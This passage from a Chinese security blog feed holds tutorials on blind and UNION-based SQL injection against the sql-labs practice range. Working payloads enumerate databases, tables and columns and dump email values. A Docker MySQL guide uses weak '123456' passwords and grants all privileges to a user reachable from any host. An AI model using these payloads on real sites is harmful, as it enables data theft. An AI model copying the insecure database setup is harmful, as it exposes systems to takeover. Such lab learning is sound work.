operator">=</span><span class="token number">1</span><span class="token string">' and (select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails<span class="token string">' limit 1,1)='</span>emailid'<span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(21).png" alt></p><p>&emsp;说明字典选的还不够全，可能需要加下划线，或者其他字符</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(13).png" alt></p><p>&emsp;这里就先加入下划线，如果不行再加入其他字符</p><p>&emsp;爆破的结果中果然出现了下划线，正确的字段名为<code>email_id</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard.png" alt></p><p>&emsp;最后再验证下，返回了正确的页面</p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(14).png" alt></p><ul><li>有了上面的表名字段字段名，就到了最重要的取数据环节了</li></ul><p>在获取了数据库名，表名，字段名之后，最重要的肯定就是取数值了，因为数据才是最重要的</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select email_id from emails limit 0,1),1,1)='</span><span class="token number">a</span>'<span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and substr((select email_id from emails limit 0,1),1,1)='</span><span class="token number">b</span>'<span class="token comment" spellcheck="true">--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>&emsp;因为数据取值是多种多样的，可能会出现任何字符，而且长度也说不准，所以字典数据可能很多，爆破时间也比较长</p><p>&emsp;这里就先尝试爆破字段email_id的第一个值，可以通过字段的含义去选择字典值</p><p>&emsp;因为是邮箱地址，所以一般是<code>字母（windows下不区分大小写）</code>，<code>@</code>，和点<code>.</code>，还有<code>数字</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(16).png" alt></p><p>&emsp;爆破的结果果然是个邮箱：<code>dumb@dhakkan.com</code></p><p><img src="/2020/08/19/%EF%BC%88%E5%9B%9B%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5/clipboard(2).png" alt></p><p>&emsp;最后可以用前面同样的方式去验证字段值的正确性</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>（三）SQL注入—联合注入实操</title>
      <link href="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/"/>
      <url>/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<ul><li>在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值</li><li>我选择的是靶场sql-labs的第一关，因为比较简单</li><li>为了能够更加清晰地找出问题所在，需要改下靶场源码，让靶场能够有回显</li></ul><pre class=" language-php"><code class="language-php">首先找到<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>在底下加入 <span class="token keyword">echo</span> <span class="token string">"有效输入："</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>然后找到 <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span>在底下加入 <span class="token keyword">echo</span> <span class="token string">"执行的sql语句"</span><span class="token punctuation">.</span><span class="token string">"$sql"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></code></pre><ul><li>加入了之后页面是这样的，拥有输入回显和SQL语句回显</li></ul><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" alt></p><ul><li>首先我们尝试单引号<code>&#39;</code>报错回显，发现是可以造成SQL语法错误的</li></ul><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(9).png" alt></p><ul><li>然后我们尝试下<code>?id=1&#39; and 1=1#</code>,然后问题就出来了，<code>#</code>并没有注释掉后面的内容</li></ul><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(6).png" alt></p><ul><li>OK，那<code>#</code>不行，那我们尝试下<code>--</code>，然而很遗憾，依旧是注释不掉后面的内容</li></ul><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(2).png" alt></p><ul><li>后来我看了下别人的方法，才发现很多细节是我没学到的</li><li>比如URL栏里的<code>#</code>会将后面的内容全部注释掉，所以发送的请求包<code>#</code>后的内容包括<code>#</code>都会消失</li></ul><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(10).png" alt="通过抓包可以证明请求包中确实不会出现#"></p><ul><li>所以想用到<code>#</code>注释，必须要先将<code>#</code>经过URL编码，<code>#</code>的URL编码是%23</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>这里必须注意<span class="token operator">and</span>两边必须有空格，否则语句将会不成立</code></pre><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(7).png" alt></p><ul><li>然后再说说注释符号<code>--</code>，在使用符号<code>--</code>注释的时候，<code>--</code>后面不能跟单引号<code>&#39;</code>，需要用到一个<code>+</code>分格，<code>+</code>在语句中会变成空格，这就是为什么许多人注入的语句后面是<code>--+</code>的原因。</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(13).png" alt></p><ul><li>在踩了这几个坑后就可以开始正式的操作啦</li></ul><br><ul><li>第一步，利用order by判断字段数量</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;在<code>order by</code>还是<code>3</code>的时候，页面还是显示正常的</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(8).png" alt></p><p>&emsp;到<code>4</code>的时候页面就出错了</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(1).png" alt></p><p>&emsp;说明调用的这张表，它只有三个字段</p><ul><li>第二步，利用联合注入判断显示位置，看看哪个字段可以显示在页面上</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;结果只有2和3才能显示在页面上</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(12).png" alt></p><ul><li>第三步，查看数据库信息,将显示位3替换为其他信息的查询</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,CONCAT_WS('</span><span class="token operator">|</span>'<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>这里注意，分割符号两边得加引号</code></pre><p>&emsp;可以看到显示位3上输出了许多信息</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(11).png" alt></p><ul><li>第四步，在已知数据库名为security后，列出所有的表名</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;通过不断变换limit的参数，可以查看不同的表名</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard.png" alt></p><ul><li>第五步，在已知数据库为security且表名为emails的情况下，查看表的字段</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;同样的，变换limit的参数，可以查看不同的字段</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(3).png" alt></p><ul><li>第六步，已知字段值的情况下，查看表emails的字段值</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id<span class="token punctuation">)</span> <span class="token keyword">from</span> emails<span class="token comment" spellcheck="true">--+</span></code></pre><p>&emsp;通过group_concat可以列出指定字段的所有值，并且排成一行，默认是逗号分格</p><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(4).png" alt></p><ul><li>总结下<ul><li>联合注入的基本步骤为：查找注入点-&gt;查找显示位-&gt;输出数据库信息-&gt;根据数据库名输出表名-&gt;根据数据库名和表名输出字段名-&gt;根据表名和字段名输出字段值</li><li>数据库<code>information_schema</code>中表<code>tables</code>是用来记录所有表名的，而表<code>columns</code>是用来记录所有字段名的</li><li>请求包不会出现<code>#</code>号，只能经过URL编码</li><li>用–注释，如果后面有单引号，注释是不会生效的，需要插入<code>+</code>号，<code>+</code>会自动转换成空格，所以最好地注释就是<code>--+</code></li><li>SQL语句对空格挺敏感的，一旦该加空格的地方没加空格，语句就会不成立</li><li>在使用CONCAT_WS()的时候，分隔符号两边必须加引号</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>用docker部署mysql环境</title>
      <link href="/2020/08/17/%E7%94%A8docker%E9%83%A8%E7%BD%B2mysql%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/08/17/%E7%94%A8docker%E9%83%A8%E7%BD%B2mysql%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<ul><li>搜索并下载镜像 </li></ul><pre><code>docker search mysql/mysql-server      (这是一个优化过的镜像)</code></pre><p><img src="/2020/08/17/%E7%94%A8docker%E9%83%A8%E7%BD%B2mysql%E7%8E%AF%E5%A2%83/1.png" alt></p><ul><li>运行镜像</li></ul><pre><code>docker run -d -p 3306:3306 --name 1mysql mysql/mysql-server</code></pre><ul><li>查看该mysql容器的默认mysql密码</li></ul><pre><code>docker logs 1mysql    这里可以看到默认密码： ALYr7atHubRyNHoBAcArjefTIP[</code></pre><p><img src="/2020/08/17/%E7%94%A8docker%E9%83%A8%E7%BD%B2mysql%E7%8E%AF%E5%A2%83/clipboard.png" alt></p><ul><li>进入容器</li></ul><pre><code>docker exec -it 1mysql bash</code></pre><ul><li>修改默认密码</li></ul><pre class=" language-sql"><code class="language-sql">mysql <span class="token operator">-</span>uroot <span class="token operator">-</span>p 输入默认密码，默认密码是隐藏的，不要以为复制不了 修改密码的语句： <span class="token keyword">ALTER</span> <span class="token keyword">USER</span> <span class="token string">'root'</span>@'localhost<span class="token string">' IDENTIFIED BY '</span><span class="token number">123456</span>'<span class="token punctuation">;</span>  记住后面的<span class="token punctuation">;</span>不要忘记了</code></pre><ul><li>如何添加一个用户</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">user</span> <span class="token string">'wkai'</span>@'localhost<span class="token string">' identified by '</span><span class="token number">123456</span>'<span class="token punctuation">;</span></code></pre><ul><li>如何创建一个任意地方都能访问的用户，然后赋予权限</li></ul><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'wkai'</span>@'<span class="token operator">%</span><span class="token string">' IDENTIFIED BY '</span><span class="token number">123456</span><span class="token string">';    %指的是任意地方都能访问 GRANT ALL PRIVILEGES  ON *.* TO '</span>wkai<span class="token string">'@'</span><span class="token operator">%</span>'        <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span><span class="token punctuation">;</span></code></pre><ul><li>成功用Navicat来连接数据库</li></ul><p><img src="/2020/08/17/%E7%94%A8docker%E9%83%A8%E7%BD%B2mysql%E7%8E%AF%E5%A2%83/clipboard(1).png" alt></p><ul><li>修改默认字符为UTF-8 需要安装vim<ul><li>编辑/etc/my.cnf</li><li>找到[mysqld]</li></ul></li></ul><pre><code>在[mysqld]下添加以下代码 character-set-server=utf8 [client] default-character-set=utf8 [mysql] default-character-set=utf8</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>（三）SQL注入—联合注入原理</title>
      <link href="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"/>
      <url>/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<ul><li>本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。</li><li>首先列出测试用的表结构和数据</li></ul><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(6).png" alt="数据库test的所有表"></p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(5).png" alt="表test2"></p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(7).png" alt="表test3"></p><ul><li>在参数后添加引号，尝试语法错误回显，并用and 1=1#或者and 1=1#测试报错</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#        页面返回正常</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token comment" spellcheck="true">#        页面返回不正常</span>这里<span class="token comment" spellcheck="true">#的意思是注释掉结尾的引号</span>因为注入后的语句可能是 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>' 这结尾最后的引号是会报错的但是如果加了<span class="token comment" spellcheck="true">#，后面的引号就会被注释掉，变成：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">#'</span>同样的注释方法还可以用<span class="token comment" spellcheck="true">--代替#，不同的数据库有不同的注释字符：</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> <span class="token keyword">columns</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment" spellcheck="true">--'</span></code></pre><ul><li>利用<strong>order by</strong>猜测字段的数量：<strong>order by后面加字段名或者列号，可以让查询结果以次字段排序</strong></li></ul><pre><code>?id=1%27%20order%0aby%0c2%23    --返回正常--上边用%0a和%0c的URL编码可以代替空格，到数据库后就是空格的意思?id=1%27 order by 3#            --返回正常?id=1%27 order by 4#            --返回正常?id=1%27 order by 5#            --返回错误--这就证明字段总数为4，不存在第五列在order by后面加入数字，可以代替字段名比如order by column1 就可以用 order by 1代替</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(2).png" alt="用存在的列号排序后去查询"></p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(1).png" alt="用不存在的列号4去查询"></p><ul><li>利用UNION联合查询，可以判断显示位置</li></ul><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">#</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> 查询了一个不存在的列，返回结果为一个空值<span class="token keyword">union</span> 右边查询的结果将会和左边的查询结果合并，重复的将会只显示一行<span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> 直接返回一行值，内容为<span class="token number">1</span>，<span class="token number">2</span>，<span class="token number">3</span></code></pre><ul><li>假如SQL语句查询了所有字段，但是页面只是调用了其中几个字段的值</li></ul><pre><code>SELECT * FROM test2 where id=-1 UNION select 1,2,3;</code></pre><ul><li><p>这个时候，我们就可以在UNION的右边插入想测试的值，比如1，2，3，假如页面中只显示了1和3，说明1和3的位置是能显示的，可以调用类似database()的函数</p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard.png" alt></p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(9).png" alt="将3换成database()，将会插入数据库名"></p></li><li><p>利用联合查询输出数据库信息</p></li></ul><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>CONCAT_WS<span class="token punctuation">(</span>CHAR<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">--获取数据库用户名</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库名</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--获取数据库版本信息</span>concat_ws<span class="token punctuation">(</span>separator<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">--含有分隔符地连接字符串 </span><span class="token comment" spellcheck="true">--里边这的separator分隔符，用 char() 函数把 空格:空格 的ASCII码输出</span><span class="token comment" spellcheck="true">--其它信息</span>@<span class="token variable">@datadir</span>                <span class="token comment" spellcheck="true">--数据库路径</span>@<span class="token variable">@version_compile_os</span>    <span class="token comment" spellcheck="true">--操作系统版本</span></code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" alt="查询到的用户名，数据库名，mysql版本"></p><ul><li>利用联合查询查询数据库test的所有表名</li></ul><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">--information_schema.tables 从数据库information_schema中查询表tables，tables中存取了所有的表，并且这些表都有对应的数据库名，其中存储表名的字段名为table_name，存储</span>数据库名的字段名为table_schema<span class="token comment" spellcheck="true">--table_schema=数据库名16进制或者用单引号括起来</span><span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre><ul><li><p>不断地改变limit的第一个参数，就能爆出所有的表</p><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(4).png" alt></p></li><li><p>查询表test2的字段</p></li></ul><pre class=" language-sql"><code class="language-sql">id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">27</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'test'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'test2'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">--information_schema.columns 从数据库information_schema中查询表columns，查询条件为数据库名table_schema和表名table_name，查询的值为字段名column_name</span>表<span class="token keyword">columns</span>中记录了所有的字段名<span class="token comment" spellcheck="true">--limit 0,1 查询结果中从第0个数据开始只读取一个数据</span></code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(8).png" alt></p><ul><li>爆出表test3的所有字段值</li></ul><pre><code>union select 1,2,group_concat(sex) from test3;--用字段名sex从表中取数据group_concat(str1,str2,...)    --连接一个组的所有字符串</code></pre><p><img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(10).png" alt="字段sex的所有值，默认用逗号分割了"></p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试—信息收集</title>
      <link href="/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2020/08/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
